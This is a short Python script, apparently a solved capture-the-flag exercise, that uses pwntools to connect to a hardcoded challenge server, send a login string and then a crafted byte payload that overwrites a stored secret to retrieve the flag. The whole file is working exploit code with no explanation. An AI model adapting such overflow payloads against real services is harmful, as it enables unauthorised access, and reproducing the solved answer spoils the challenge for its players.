# resolved
# coding=utf-8
from pwn import *

host = "62.173.140.174"
port = 17200
r = remote(host, port)
log = b'CODEBY_Secret_Base'  # 32
payload = b'\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x43\x4F\x44\x45\x42\x59\x5F\x53\x65\x63\x72\x65\x74\x5F\x42\x61\x73\x65\x00\x00\xDB\xBC\xED'
a = True
chet = 0


while a:
    chet += 1
    answer = r.recv().decode('utf-8')
    if "CODEBY" in answer:
        print(answer)
        a = False
    if 'Enter' in answer:
        r.sendline(log)
    if 'Now tell me the secret key:' in answer:
        r.sendline(payload)